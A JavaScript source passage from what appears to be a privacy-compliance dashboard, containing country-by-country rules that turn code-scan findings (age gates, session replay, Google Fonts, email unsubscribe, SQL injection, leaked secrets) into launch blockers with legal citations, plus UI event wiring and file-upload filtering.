      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw) {
        blockers.push({
          title: 'Protection of Incompetent Persons and Children\'s Data',
          law: 'PDPL Executive Regulations Article 13',
          desc: 'Processing data of children requires guardian approval in the Kingdom.',
          fix: 'Deploy age gate and require guardian consent for minors.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'korea',
    name: 'South Korea',
    flag: '🇰🇷',
    region: 'Asia-Pacific',
    countries: ['South Korea'],
    governingLaws: 'Personal Information Protection Act (PIPA) & Information and Communications Network Act',
    statutoryPenalties: 'Up to 3% of total annual revenue; criminal penalties up to 5 years imprisonment',
    regulatoryBody: 'Personal Information Protection Commission (PIPC)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Processing Children\'s Data (<14 Years) Without Legal Representative Consent',
          law: 'PIPA Article 22-2 (Consent for Processing Children\'s Personal Information)',
          desc: 'South Korea requires verified consent from a legal representative (parent/guardian) prior to collecting personal data from children under 14. Strict enforcement by PIPC with fines up to 3% of total revenue.',
          fix: 'Deploy a mandatory Date of Birth gate on signup. For users under 14, require Korean mobile carrier authentication or certified guardian consent before proceeding.'
        });
      }

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw || answers['PRIV-08'] === 'gap') {
        blockers.push({
          title: 'Behavioral Telemetry & Session Profiling Without Prior Opt-In',
          law: 'PIPA Article 39-3 & Article 15',
          desc: 'Recording keystrokes and user interaction via session replay SDKs without explicit, unbundled prior opt-in consent is unlawful in Korea.',
          fix: 'Gate all session recording tools behind explicit opt-in consent checkboxes and enable strict DOM masking.'
        });
      }

      const fontFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-GOOGLE-FONTS');
      if (fontFlaw) {
        warnings.push({
          title: 'Overseas Transfer of User IP Telemetry via Dynamic Fonts',
          law: 'PIPA Article 28-8 (Overseas Transfer of Personal Information)',
          desc: 'Dynamic HTTP font fetching transmits user IP addresses to foreign servers without disclosure.',
          fix: 'Bundle fonts locally in assets or set `GoogleFonts.config.allowRuntimeFetching = false;`.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'switzerland',
    name: 'Switzerland',
    flag: '🇨🇭',
    region: 'Europe',
    countries: ['Switzerland'],
    governingLaws: 'Federal Act on Data Protection (Revised FADP / DSG 2023)',
    statutoryPenalties: 'Criminal fines up to CHF 250,000 against responsible company managers; FDPIC administrative orders',
    regulatoryBody: 'Federal Data Protection and Information Commissioner (FDPIC)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const fontFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-GOOGLE-FONTS');
      if (fontFlaw || answers['PRIV-07'] === 'gap') {
        blockers.push({
          title: 'Cross-Border Transmission of IP Addresses via Google Fonts',
          law: 'Swiss FADP Article 16 & Article 6',
          desc: 'Dynamic Google Fonts fetching transmits Swiss users\' IP addresses to US servers without adequate contractual safeguards, violating revised Swiss FADP data transfer principles.',
          fix: 'Bundle font files locally in `assets/` and disable dynamic runtime fetching (`allowRuntimeFetching = false;`).'
        });
      }

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw || answers['PRIV-08'] === 'gap') {
        blockers.push({
          title: 'Unlawful Personality Rights Infringement via Keystroke Recording',
          law: 'Swiss FADP Article 6 & Swiss Civil Code Art. 28',
          desc: 'Capturing user input sessions without transparent notice and consent constitutes unlawful infringement of personality rights.',
          fix: 'Obtain active opt-in consent before initializing session replay scripts and mask all sensitive form fields.'
        });
      }

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Processing Children\'s Personal Data Without Guardian Representation',
          law: 'Revised Swiss FADP Article 6 & Swiss Civil Code Art. 19',
          desc: 'Processing personal data of minors lacking capacity without legal representative consent violates FADP good faith and personality rights.',
          fix: 'Add neutral Date of Birth gate on signup and secure guardian consent for minors.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'singapore',
    name: 'Singapore',
    flag: '🇸🇬',
    region: 'Asia-Pacific',
    countries: ['Singapore'],
    governingLaws: 'Personal Data Protection Act (PDPA 2012) & Spam Control Act (Cap. 311A)',
    statutoryPenalties: 'Up to 10% of annual turnover in Singapore or SGD 1,000,000; Spam Control statutory damages',
    regulatoryBody: 'Personal Data Protection Commission (PDPC)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Collecting Children\'s Data (<13 Years) Without Parental Consent',
          law: 'PDPA 2012 & PDPC Advisory Guidelines on Children\'s Personal Data',
          desc: 'Organizations must obtain consent from a parent or legal guardian to collect personal data from children under 13.',
          fix: 'Deploy age verification gate and require verifiable parental consent for users under 13.'
        });
      }

      const emailFlaw = findings.find(f => f.ruleId === 'SEC-COMM-EMAIL-COMPLIANCE');
      if (emailFlaw || answers['COMM-01'] === 'gap') {
        blockers.push({
          title: 'Spam Control Act Electronic Mail Marketing Violation',
          law: 'Spam Control Act (Cap. 311A) First Schedule (Unsubscribe Facility)',
          desc: 'Sending commercial electronic messages without an unsubscribe facility that remains operational for 30 days and sender identification is unlawful in Singapore.',
          fix: 'Add one-click unsubscribe URL token and registered physical corporate address in email footers.'
        });
      }

      const sqliFlaw = findings.find(f => f.category === 'Database Attacks');
      const secretFlaw = findings.find(f => f.category === 'Secret Leak');
      if (sqliFlaw || secretFlaw) {
        blockers.push({
          title: 'Breach of PDPA Protection Obligation',
          law: 'PDPA 2012 Section 24 (Protection of Personal Data)',
          desc: 'Organizations must make reasonable security arrangements to prevent unauthorized access or disclosure. Exposed secrets or SQL vulnerabilities trigger major PDPC financial penalties.',
          fix: 'Enforce parameterized database queries and eliminate hardcoded credentials.'
        });
      }

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw || answers['PRIV-08'] === 'gap') {
        warnings.push({
          title: 'PDPA Consent & Purpose Limitation for Session Telemetry',
          law: 'PDPA 2012 Section 13 (Consent Required)',
          desc: 'Collecting user browsing behavior requires prior notification and consent.',
          fix: 'Prompt for cookie consent prior to telemetry firing.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'uae',
    name: 'United Arab Emirates',
    flag: '🇦🇪',
    region: 'Middle East',
    countries: ['United Arab Emirates'],
    governingLaws: 'Federal Decree-Law No. 45/2021 on Personal Data Protection (UAE PDPL)',
    statutoryPenalties: 'Administrative fines up to AED 10,000,000; suspension of digital services',
    regulatoryBody: 'UAE Data Office',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'Processing Children\'s Data Without Legal Guardian Consent',
          law: 'UAE PDPL Article 12 (Special Protection for Child Data)',
          desc: 'Processing personal data belonging to children without guardian authorization is prohibited under Federal Decree-Law No. 45/2021.',
          fix: 'Deploy age gate and require verifiable guardian consent for minor UAE residents.'
        });
      }

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw) {
        warnings.push({
          title: 'Cross-Border Personal Data Transfer Restrictions',
          law: 'UAE PDPL Article 22 & 23',
          desc: 'Cross-border telemetry exfiltration requires compliance with UAE Data Office transfer safeguards.',
          fix: 'Obtain affirmative user consent and mask all input fields.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'southafrica',
    name: 'South Africa',
    flag: '🇿🇦',
    region: 'Africa',
    countries: ['South Africa'],
    governingLaws: 'Protection of Personal Information Act (POPIA No. 4 of 2013)',
    statutoryPenalties: 'Fines up to ZAR 10,000,000 or up to 10 years imprisonment for serious violations',
    regulatoryBody: 'Information Regulator (South Africa)',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'General Prohibition on Processing Personal Information of Children',
          law: 'POPIA Section 34 & Section 35',
          desc: 'POPIA strictly prohibits processing personal information concerning children (<18) unless prior consent of a competent person (parent/guardian) is secured.',
          fix: 'Deploy neutral Date of Birth verification on signup and require parental consent for minors.'
        });
      }

      const emailFlaw = findings.find(f => f.ruleId === 'SEC-COMM-EMAIL-COMPLIANCE');
      if (emailFlaw || answers['COMM-01'] === 'gap') {
        blockers.push({
          title: 'Direct Marketing by Electronic Means Violation',
          law: 'POPIA Section 69 (Direct Marketing by Means of Unsolicited Electronic Communications)',
          desc: 'Outbound communications require opt-in consent and mandatory sender identification with unsubscribe mechanism.',
          fix: 'Add functional unsubscribe link and physical corporate address to all email dispatch templates.'
        });
      }

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw) {
        warnings.push({
          title: 'Condition 2 (Processing Limitation) for Telemetry Tracking',
          law: 'POPIA Section 9, 10 & 11',
          desc: 'Session recording scripts must have explicit consent or legitimate justification.',
          fix: 'Collect user consent before initializing replay tools.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  },
  {
    id: 'global-baseline',
    name: 'Rest of World (Global Baseline)',
    flag: '🌐',
    region: 'Global',
    countries: GLOBAL_COUNTRY_CATALOGUE.filter(c => c.jId === 'global-baseline').map(c => c.name),
    governingLaws: 'International Data Protection Baseline (OECD Privacy Guidelines, UN Minor Rights & ISO/IEC 27701)',
    statutoryPenalties: 'National DPA enforcement orders, statutory consumer fines, and app store rejection risk',
    regulatoryBody: 'National Regulatory Commissions & Global Enforcement Authorities',
    evaluate: (findings, answers) => {
      const blockers = [];
      const warnings = [];

      const coppaFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-COPPA-AGEGATE');
      if (coppaFlaw || answers['PRIV-06'] === 'gap') {
        blockers.push({
          title: 'International Child Privacy & Minor Safety Baseline Breach',
          law: 'UN Convention on Rights of Child & National Minor Privacy Standards',
          desc: 'Collecting personal data without neutral age verification exposes services to regulatory blocks and mobile app store distribution suspension.',
          fix: 'Implement Date of Birth gate on registration flow and require parental consent for underage users.'
        });
      }

      const sqliFlaw = findings.find(f => f.category === 'Database Attacks');
      const secretFlaw = findings.find(f => f.category === 'Secret Leak');
      if (sqliFlaw || secretFlaw) {
        blockers.push({
          title: 'Critical Security Safeguard Failure (ISO/IEC 27001 Baseline)',
          law: 'International Baseline Security Controls & National Data Protection Safeguards',
          desc: 'SQL injection risks and leaked credentials violate mandatory minimum cybersecurity safeguards across global jurisdictions.',
          fix: 'Sanitize queries with parameterized statements and eliminate hardcoded credentials.'
        });
      }

      const emailFlaw = findings.find(f => f.ruleId === 'SEC-COMM-EMAIL-COMPLIANCE');
      if (emailFlaw) {
        warnings.push({
          title: 'Unsolicited Commercial Messaging Advisory',
          law: 'Global Anti-Spam Frameworks',
          desc: 'Commercial emails without an unsubscribe facility risk instant domain blacklisting and statutory spam penalties.',
          fix: 'Add one-click unsubscribe mechanism and physical mailing address.'
        });
      }

      const replayFlaw = findings.find(f => f.ruleId === 'SEC-PRIV-SESSION-REPLAY');
      if (replayFlaw) {
        warnings.push({
          title: 'Behavioral Tracking Transparency Advisory',
          law: 'Fair Information Practice Principles (FIPPs)',
          desc: 'Session recording scripts should obtain transparent opt-in consent.',
          fix: 'Enable consent banner and mask all sensitive form fields.'
        });
      }

      const status = blockers.length > 0 ? 'blocked' : (warnings.length > 0 ? 'restricted' : 'ready');
      return { status, blockers, warnings };
    }
  }
];

// --- 7. Application State ---
class ComplianceApp {
  constructor() {
    this.answers = this.loadAnswers();
    this.activeFramework = 'all';
    this.activeCategory = 'all';
    this.activeStatus = 'all';
    this.searchQuery = '';
    this.currentModalControlId = null;

    this.initElements();
    this.bindEvents();
    this.render();
  }

  loadAnswers() {
    try {
      const saved = localStorage.getItem('compliance_shield_answers');
      return saved ? JSON.parse(saved) : {};
    } catch (e) {
      return {};
    }
  }

  saveAnswers() {
    try {
      localStorage.setItem('compliance_shield_answers', JSON.stringify(this.answers));
    } catch (e) {
      console.error(e);
    }
  }

  initElements() {
    this.cardsContainer = document.getElementById('frameworkCardsContainer');
    this.controlsContainer = document.getElementById('controlsContainer');
    this.gapsContainer = document.getElementById('gapsContainer');
    this.roadmapContainer = document.getElementById('roadmapContainer');
    this.overallScoreVal = document.getElementById('overallScoreVal');
    this.overallRing = document.getElementById('overallRing');
    this.passCountEl = document.getElementById('passCount');
    this.gapCountEl = document.getElementById('gapCount');
    this.pendingCountEl = document.getElementById('pendingCount');

    // Tabs
    this.tabAnsweredCount = document.getElementById('tabAnsweredCount');
    this.tabTotalCount = document.getElementById('tabTotalCount');
    this.tabGapsCount = document.getElementById('tabGapsCount');

    // Inputs
    this.appNameInput = document.getElementById('appNameInput');
    this.appUrlInput = document.getElementById('appUrlInput');
    this.samplePreset = document.getElementById('samplePreset');
    this.checklistSearch = document.getElementById('checklistSearch');
    this.categoryFilter = document.getElementById('categoryFilter');
    this.statusFilter = document.getElementById('statusFilter');

    // Modals
    this.controlModal = document.getElementById('controlModal');
    this.exportModal = document.getElementById('exportModal');
    this.policyPreview = document.getElementById('policyPreview');
    this.policyTitle = document.getElementById('policyTitle');

    // Code & Secret Scanner Elements
    this.codeEditorInput = document.getElementById('codeEditorInput');
    this.codeFileInput = document.getElementById('codeFileInput');
    this.fileDropzone = document.getElementById('fileDropzone');
    this.findingsContainer = document.getElementById('findingsContainer');
    this.tabCodeVulnCount = document.getElementById('tabCodeVulnCount');
    this.scanRiskGrade = document.getElementById('scanRiskGrade');
    this.gradeLetter = document.getElementById('gradeLetter');
    this.flawsCritical = document.getElementById('flawsCritical');
    this.flawsHigh = document.getElementById('flawsHigh');
    this.flawsSecrets = document.getElementById('flawsSecrets');
    this.flawsSql = document.getElementById('flawsSql');
    this.syncActionBar = document.getElementById('syncActionBar');
    this.codeLineCount = document.getElementById('codeLineCount');
    this.codeCharCount = document.getElementById('codeCharCount');
    this.scanTimestamp = document.getElementById('scanTimestamp');
    this.latestCodeFindings = [];

    // Hero Codebase Upload Elements
    this.btnModeUpload = document.getElementById('btnModeUpload');
    this.btnModeUrl = document.getElementById('btnModeUrl');
    this.panelModeUpload = document.getElementById('panelModeUpload');
    this.panelModeUrl = document.getElementById('panelModeUrl');
    this.heroDropzone = document.getElementById('heroDropzone');
    this.heroFileInput = document.getElementById('heroFileInput');
    this.heroFolderInput = document.getElementById('heroFolderInput');
    this.btnBrowseFiles = document.getElementById('btnBrowseFiles');
    this.btnBrowseFolder = document.getElementById('btnBrowseFolder');
    this.uploadStatusText = document.getElementById('uploadStatusText');

    // Global Launch Readiness Elements
    this.tabLaunchBlockedCount = document.getElementById('tabLaunchBlockedCount');
    this.launchHeroBanner = document.getElementById('launchHeroBanner');
    this.jurisdictionsContainer = document.getElementById('jurisdictionsContainer');
    this.launchSearchInput = document.getElementById('launchSearchInput');
    this.launchStatusFilter = document.getElementById('launchStatusFilter');
    this.launchViewMode = 'countries'; // 'countries' | 'jurisdictions'
    this.btnLaunchModeCountries = document.getElementById('btnLaunchModeCountries');
    this.btnLaunchModeJurisdictions = document.getElementById('btnLaunchModeJurisdictions');
  }

  bindEvents() {
    // Hero Mode Toggles
    if (this.btnModeUpload && this.btnModeUrl) {
      this.btnModeUpload.addEventListener('click', () => {
        this.btnModeUpload.classList.add('active');
        this.btnModeUrl.classList.remove('active');
        if (this.panelModeUpload) this.panelModeUpload.style.display = 'block';
        if (this.panelModeUrl) this.panelModeUrl.style.display = 'none';
      });

      this.btnModeUrl.addEventListener('click', () => {
        this.btnModeUrl.classList.add('active');
        this.btnModeUpload.classList.remove('active');
        if (this.panelModeUrl) this.panelModeUrl.style.display = 'block';
        if (this.panelModeUpload) this.panelModeUpload.style.display = 'none';
      });
    }

    // Hero File Upload & Dropzone
    if (this.heroFileInput) {
      this.btnBrowseFiles?.addEventListener('click', (e) => {
        e.stopPropagation();
        this.heroFileInput.click();
      });

      this.heroDropzone?.addEventListener('click', () => {
        this.heroFileInput.click();
      });

      this.heroDropzone?.addEventListener('dragover', (e) => {
        e.preventDefault();
        this.heroDropzone.classList.add('dragover');
      });

      this.heroDropzone?.addEventListener('dragleave', () => {
        this.heroDropzone.classList.remove('dragover');
      });

      this.heroDropzone?.addEventListener('drop', (e) => {
        e.preventDefault();
        this.heroDropzone.classList.remove('dragover');
        if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
          this.handleMultiFileUpload(e.dataTransfer.files);
        }
      });

      this.heroFileInput.addEventListener('change', (e) => {
        if (e.target.files && e.target.files.length > 0) {
          this.handleMultiFileUpload(e.target.files);
        }
      });
    }

    // Hero Folder / App Bundle Upload
    if (this.heroFolderInput) {
      this.btnBrowseFolder?.addEventListener('click', (e) => {
        e.stopPropagation();
        this.heroFolderInput.click();
      });

      this.heroFolderInput.addEventListener('change', (e) => {
        if (e.target.files && e.target.files.length > 0) {
          this.handleMultiFileUpload(e.target.files);
        }
      });
    }

    // Hero Sample Shortcuts
    document.getElementById('heroBtnSampleSqli')?.addEventListener('click', () => {
      this.loadCodePreset('sqli');
      const codeTabBtn = document.querySelector('.nav-tab[data-tab="codescan"]');
      if (codeTabBtn) codeTabBtn.click();
    });

    document.getElementById('heroBtnSampleSecrets')?.addEventListener('click', () => {
      this.loadCodePreset('secrets');
      const codeTabBtn = document.querySelector('.nav-tab[data-tab="codescan"]');
      if (codeTabBtn) codeTabBtn.click();
    });

    document.getElementById('heroBtnSampleSecure')?.addEventListener('click', () => {
      this.loadCodePreset('secure');
      const codeTabBtn = document.querySelector('.nav-tab[data-tab="codescan"]');
      if (codeTabBtn) codeTabBtn.click();
    });

    document.getElementById('heroBtnSampleCoppa')?.addEventListener('click', () => {
      this.loadCodePreset('coppa');
      const codeTabBtn = document.querySelector('.nav-tab[data-tab="codescan"]');
      if (codeTabBtn) codeTabBtn.click();
    });

    document.getElementById('heroBtnSampleFonts')?.addEventListener('click', () => {
      this.loadCodePreset('fonts');
      const codeTabBtn = document.querySelector('.nav-tab[data-tab="codescan"]');
      if (codeTabBtn) codeTabBtn.click();
    });

    document.getElementById('heroBtnSampleReplay')?.addEventListener('click', () => {
      this.loadCodePreset('replay');
      const codeTabBtn = document.querySelector('.nav-tab[data-tab="codescan"]');
      if (codeTabBtn) codeTabBtn.click();
    });

    document.getElementById('heroBtnSampleEmail')?.addEventListener('click', () => {
      this.loadCodePreset('email');
      const codeTabBtn = document.querySelector('.nav-tab[data-tab="codescan"]');
      if (codeTabBtn) codeTabBtn.click();
    });

    document.getElementById('heroBtnSampleFlutter')?.addEventListener('click', () => {
      this.loadCodePreset('flutter_bundle');
      const codeTabBtn = document.querySelector('.nav-tab[data-tab="codescan"]');
      if (codeTabBtn) codeTabBtn.click();
    });

    // Nav tabs
    document.querySelectorAll('.nav-tab').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.nav-tab').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-view').forEach(v => v.classList.remove('active'));
        btn.classList.add('active');
        const viewId = `view-${btn.dataset.tab}`;
        const targetView = document.getElementById(viewId);
        if (targetView) targetView.classList.add('active');
      });
    });

    // Preset selector
    this.samplePreset.addEventListener('change', (e) => {
      const val = e.target.value;
      if (PRESETS[val]) {
        this.answers = { ...PRESETS[val] };
        this.saveAnswers();
        this.render();
        this.showToast(`Applied preset: ${e.target.options[e.target.selectedIndex].text}`);
      }
    });

    // Reset button
    document.getElementById('btnResetAll').addEventListener('click', () => {
      if (confirm('Are you sure you want to reset all compliance answers?')) {
        this.answers = {};
        this.saveAnswers();
        this.samplePreset.value = 'custom';
        this.render();
        this.showToast('All answers have been reset.');
      }
    });

    // Quick Audit Scan button
    document.getElementById('btnFastScan').addEventListener('click', () => {
      this.runAutomatedQuickScan();
    });

    // Filters and Search
    this.checklistSearch.addEventListener('input', (e) => {
      this.searchQuery = e.target.value.toLowerCase().trim();
      this.renderControlsList();
    });

    this.categoryFilter.addEventListener('change', (e) => {
      this.activeCategory = e.target.value;
      this.renderControlsList();
    });

    this.statusFilter.addEventListener('change', (e) => {
      this.activeStatus = e.target.value;
      this.renderControlsList();
    });

    // Batch buttons
    document.getElementById('btnBatchPass').addEventListener('click', () => {
      const visible = this.getFilteredControls();
      visible.forEach(c => { this.answers[c.id] = 'compliant'; });
      this.saveAnswers();
      this.render();
      this.showToast(`Marked ${visible.length} visible controls as Compliant`);
    });

    document.getElementById('btnBatchClear').addEventListener('click', () => {
      const visible = this.getFilteredControls();
      visible.forEach(c => { delete this.answers[c.id]; });
      this.saveAnswers();
      this.render();
      this.showToast(`Cleared answers for ${visible.length} visible controls`);
    });

    // Policies sidebar click
    document.querySelectorAll('.policy-item').forEach(item => {
      item.addEventListener('click', () => {
        document.querySelectorAll('.policy-item').forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        this.renderPolicy(item.dataset.policy, item.innerText);
      });
    });

    document.getElementById('btnCopyPolicy').addEventListener('click', () => {
      const text = this.policyPreview.innerText;
      navigator.clipboard.writeText(text).then(() => {
        this.showToast('Policy template copied to clipboard!');
      });
    });

    // Export & Print
    document.getElementById('btnExportReport').addEventListener('click', () => {
      this.openExportModal();
    });
    document.getElementById('btnExportModalClose').addEventListener('click', () => {
      this.exportModal.classList.remove('open');
    });
    document.getElementById('btnExportModalClose2').addEventListener('click', () => {
      this.exportModal.classList.remove('open');
    });
    document.getElementById('btnPrintReport').addEventListener('click', () => {
      window.print();
    });
    document.getElementById('btnDownloadJson').addEventListener('click', () => {
      this.downloadJsonReport();
    });

    // Guide Modal Handlers
    const guideModal = document.getElementById('guideModal');
    document.getElementById('btnUserGuide')?.addEventListener('click', () => {
      guideModal?.classList.add('open');
    });
    document.getElementById('btnGuideModalClose')?.addEventListener('click', () => {
      guideModal?.classList.remove('open');
    });
    document.getElementById('btnGuideModalClose2')?.addEventListener('click', () => {
      guideModal?.classList.remove('open');
    });

    // Control modal handlers
    document.getElementById('btnModalClose').addEventListener('click', () => {
      this.controlModal.classList.remove('open');
    });
    document.getElementById('btnModalClose2').addEventListener('click', () => {
      this.controlModal.classList.remove('open');
    });
    document.getElementById('btnModalMarkCompliant').addEventListener('click', () => {
      if (this.currentModalControlId) {
        this.setControlStatus(this.currentModalControlId, 'compliant');
        this.controlModal.classList.remove('open');
      }
    });
    document.getElementById('btnModalMarkGap').addEventListener('click', () => {
      if (this.currentModalControlId) {
        this.setControlStatus(this.currentModalControlId, 'gap');
        this.controlModal.classList.remove('open');
      }
    });

    // --- Code & Secret Scanner Event Listeners ---
    if (this.codeEditorInput) {
      this.codeEditorInput.addEventListener('input', () => {
        this.updateCodeCounters();
      });
    }

    const btnClearCode = document.getElementById('btnClearCode');
    if (btnClearCode) {
      btnClearCode.addEventListener('click', () => {
        if (this.codeEditorInput) {
          this.codeEditorInput.value = '';
          this.updateCodeCounters();
          if (this.findingsContainer) {
            this.findingsContainer.innerHTML = `
              <div class="empty-findings-state">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                <p>Paste code or select a preset on the left, then click <strong>"Scan Code for Flaws"</strong> to inspect for security vulnerabilities.</p>
              </div>
            `;
          }
          if (this.tabCodeVulnCount) this.tabCodeVulnCount.innerText = '0';
          if (this.syncActionBar) this.syncActionBar.style.display = 'none';
          if (this.scanRiskGrade && this.gradeLetter) {
            this.scanRiskGrade.className = 'scan-grade-badge grade-neutral';
            this.gradeLetter.innerText = '—';
          }
          this.latestCodeFindings = [];
          this.renderGlobalLaunchReadiness();
        }
      });
    }

    // Presets
    document.getElementById('btnPresetSqli')?.addEventListener('click', () => this.loadCodePreset('sqli'));
    document.getElementById('btnPresetSecrets')?.addEventListener('click', () => this.loadCodePreset('secrets'));
    document.getElementById('btnPresetEval')?.addEventListener('click', () => this.loadCodePreset('eval'));
    document.getElementById('btnPresetSecure')?.addEventListener('click', () => this.loadCodePreset('secure'));
    document.getElementById('btnPresetCoppa')?.addEventListener('click', () => this.loadCodePreset('coppa'));
    document.getElementById('btnPresetFonts')?.addEventListener('click', () => this.loadCodePreset('fonts'));
    document.getElementById('btnPresetReplay')?.addEventListener('click', () => this.loadCodePreset('replay'));
    document.getElementById('btnPresetEmail')?.addEventListener('click', () => this.loadCodePreset('email'));
    document.getElementById('btnPresetFlutter')?.addEventListener('click', () => this.loadCodePreset('flutter_bundle'));

    // Global Launch View Mode Toggles
    this.btnLaunchModeCountries?.addEventListener('click', () => {
      this.launchViewMode = 'countries';
      this.btnLaunchModeCountries.classList.add('selected-pass');
      this.btnLaunchModeJurisdictions?.classList.remove('selected-pass');
      this.renderGlobalLaunchReadiness();
    });
    this.btnLaunchModeJurisdictions?.addEventListener('click', () => {
      this.launchViewMode = 'jurisdictions';
      this.btnLaunchModeJurisdictions.classList.add('selected-pass');
      this.btnLaunchModeCountries?.classList.remove('selected-pass');
      this.renderGlobalLaunchReadiness();
    });

    // Global Launch Search and Filter
    if (this.launchSearchInput) {
      this.launchSearchInput.addEventListener('input', () => {
        this.renderGlobalLaunchReadiness();
      });
    }
    if (this.launchStatusFilter) {
      this.launchStatusFilter.addEventListener('change', () => {
        this.renderGlobalLaunchReadiness();
      });
    }
    document.getElementById('btnRefreshLaunch')?.addEventListener('click', () => {
      this.renderGlobalLaunchReadiness();
      this.showToast('Global Launch Readiness evaluation updated.');
    });

    // File Drag and Drop
    if (this.fileDropzone && this.codeFileInput) {
      this.fileDropzone.addEventListener('click', () => this.codeFileInput.click());
      this.codeFileInput.addEventListener('change', (e) => {
        if (e.target.files && e.target.files[0]) {
          this.handleFileUpload(e.target.files[0]);
        }
      });
      this.fileDropzone.addEventListener('dragover', (e) => {
        e.preventDefault();
        this.fileDropzone.style.borderColor = 'var(--cyan)';
      });
      this.fileDropzone.addEventListener('dragleave', () => {
        this.fileDropzone.style.borderColor = '';
      });
      this.fileDropzone.addEventListener('drop', (e) => {
        e.preventDefault();
        this.fileDropzone.style.borderColor = '';
        if (e.dataTransfer.files && e.dataTransfer.files[0]) {
          this.handleFileUpload(e.dataTransfer.files[0]);
        }
      });
    }

    // Run Scan
    document.getElementById('btnRunCodeScan')?.addEventListener('click', () => {
      this.runCodeSecurityScan();
    });

    // Sync with Compliance Audit
    document.getElementById('btnSyncWithAudit')?.addEventListener('click', () => {
      this.syncFindingsToCompliance();
    });
  }

  // --- Code Security Scanner Methods ---
  updateCodeCounters() {
    if (!this.codeEditorInput) return;
    const val = this.codeEditorInput.value;
    const lines = val ? val.split('\n').length : 0;
    const chars = val ? val.length : 0;
    if (this.codeLineCount) this.codeLineCount.innerText = `${lines} lines`;
    if (this.codeCharCount) this.codeCharCount.innerText = `${chars} characters`;
  }

  loadCodePreset(presetKey) {
    if (CODE_PRESETS[presetKey] && this.codeEditorInput) {
      this.codeEditorInput.value = CODE_PRESETS[presetKey];
      this.updateCodeCounters();
      this.runCodeSecurityScan();
      this.showToast(`Loaded "${presetKey}" code security test preset`);
    }
  }

  handleFileUpload(file) {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (e) => {
      if (this.codeEditorInput) {
        this.codeEditorInput.value = e.target.result;
        this.updateCodeCounters();
        this.runCodeSecurityScan();
        this.showToast(`Uploaded and scanned: ${file.name}`);
      }
    };
    reader.readAsText(file);
  }

  handleMultiFileUpload(fileList) {
    if (!fileList || fileList.length === 0) return;
    const allFiles = Array.from(fileList);

    // Ignored directories for repository / app bundle scans
    const ignoredDirPatterns = [
      '/.git/', '/.dart_tool/', '/build/', '/node_modules/', '/.firebase/', 
      '/.firebase_emulator_data/', '/dist/', '/.gradle/', '/Pods/', '/.idea/', 
      '/.vscode/', '/coverage/', '/.svn/'
    ];

    // Ignored binary / heavy asset extensions
    const binaryExts = [
      '.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp', '.svg', '.pdf', 
      '.zip', '.tar', '.gz', '.apk', '.aab', '.jar', '.class', '.exe', 
      '.dll', '.so', '.dylib', '.docx', '.xlsx', '.mp3', '.mp4', '.mov', 
      '.db', '.sqlite', '.bin', '.lock'
    ];

    // Font asset extensions to detect local font bundling
    const fontExts = ['.ttf', '.otf', '.woff', '.woff2', '.eot'];

    let bundledFontsDetected = false;
    const detectedFontFiles = [];

    // Filter relevant files
    const codeFiles = allFiles.filter(file => {
      const path = '/' + (file.webkitRelativePath || file.name).replace(/\\/g, '/');
      const lower = path.toLowerCase();

      // Check if this is a bundled font asset
      if (fontExts.some(ext => lower.endsWith(ext))) {
        bundledFontsDetected = true;
